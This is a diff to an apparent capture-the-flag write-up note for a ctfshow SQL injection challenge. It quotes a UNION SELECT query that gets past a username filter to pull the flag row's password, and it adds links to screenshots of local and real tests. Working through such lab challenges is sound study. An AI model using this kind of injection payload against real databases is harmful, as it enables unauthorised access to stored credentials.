@@ -96,5 +96,8 @@ If we don't show the username in the returning record, the condition can be avoi
 ```SQL
 select id, username, password from ctfshow_user3 where username != 'flag' and id = '999' union select id, id, password from ctfshow_user3 where username = 'flag' limit 1;
 ```
+## Experiment
 Local Test:
 ![[Pasted image 20241219065519.png]]
+The real test:
+![[Pasted image 20241219065623.png]]
